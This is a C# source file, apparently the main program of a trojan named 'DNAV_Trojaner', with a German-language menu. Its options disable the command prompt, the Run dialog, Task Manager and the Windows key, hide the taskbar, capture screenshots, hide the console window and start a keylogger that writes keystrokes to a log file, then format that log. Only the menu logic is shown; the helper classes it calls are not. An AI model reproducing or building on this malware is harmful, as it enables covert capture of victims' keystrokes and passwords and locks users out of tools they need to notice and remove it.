using System;
using System.IO;

namespace DNAV_Trojaner
{
    class Program
    {
        static void Main(string[] args)
        {
            string input = "";

            do
            {
                Console.Clear();
                Console.WriteLine("\n\t***   **  * DNAV Debug Menü *  **   ***");
                Console.WriteLine("\t(1) CMD deaktivieren");
                Console.WriteLine("\t(2) Ausführen Dialog deaktivieren");
                Console.WriteLine("\t(3) Taskmanager deaktivieren");
                Console.WriteLine("\t(4) Windows Taste deaktivieren");
                Console.WriteLine("\n\t(5) Taskleiste ausblenden");
                Console.WriteLine("\t(6) Screenshot erstellen");
                Console.WriteLine("\t(7) Konsole verstecken und Keylogger starten");
                Console.WriteLine("\t(8) Keylogger Log formatieren");
                Console.WriteLine("\n\t(0) Beenden");

                Console.Write("\n\t> ");
                input = Console.ReadLine();

                switch (input)
                {
                    case "1":
                        Console.Clear();
                        Cmd.Disbable();
                        Console.WriteLine("\n\tCMD wurde deaktiviert");
                        Console.ReadKey();
                        break;
                    case "2":
                        Console.Clear();
                        Run.Disbable();
                        Console.WriteLine("\n\tAusführen Dialog wurde deaktiviert");
                        Console.ReadKey();
                        break;
                    case "3":
                        Console.Clear();
                        Taskmanager.Disable();
                        Console.WriteLine("\n\tTaskmanager wurde deaktiviert");
                        Console.ReadKey();
                        break;
                    case "4":
                        Console.Clear();
                        WindowsKey.Disable();
                        Console.WriteLine("\n\tWindows Tast wurde deaktiviert");
                        Console.ReadKey();
                        break;
                    case "5":
                        Console.Clear();
                        Taskbar.Hide();
                        Console.WriteLine("\n\tTaskleiste wurde ausgeblendet");
                        Console.ReadKey();
                        break;
                    case "6":
                        Console.Clear();
                        ScreenCapture sc = new ScreenCapture();
                        sc.CaptureScreenToFile("screenshot.png", System.Drawing.Imaging.ImageFormat.Png);
                        Console.WriteLine("\n\tScreenshot wurde erstellt");
                        Console.ReadKey();
                        break;
                    case "7":
                        Keylogger.Hide();
                        Keylogger.EnableWithLog("log.txt");
                        break;
                    case "8":
                        Console.Clear();
                        StreamReader sr = new StreamReader("log.txt");
                        string raw = sr.ReadToEnd();
                        sr.Close();
                        string compiledOutput = Keylogger.CompileRawOutput(raw);
                        StreamWriter sw = new StreamWriter("FormattedLog.txt");
                        sw.WriteLine(compiledOutput);
                        sw.Close();
                        break;

                }
            } while (input != "0");
        }
    }
}